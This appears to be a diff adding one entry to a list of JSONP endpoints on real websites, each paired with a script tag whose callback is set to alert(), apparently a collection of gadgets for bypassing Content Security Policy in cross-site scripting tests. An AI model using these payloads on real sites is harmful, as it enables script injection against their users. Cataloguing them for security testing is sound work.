@@ -1,4 +1,5 @@
 Domain	Code
+app.hushly.com <script src="https://app.hushly.com/runtime/visitor?callback=alert(d1)//"></script>
 7b936.v.fwmrm.net	<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script> 
 a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>
 acs.aliexpress.com	<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>
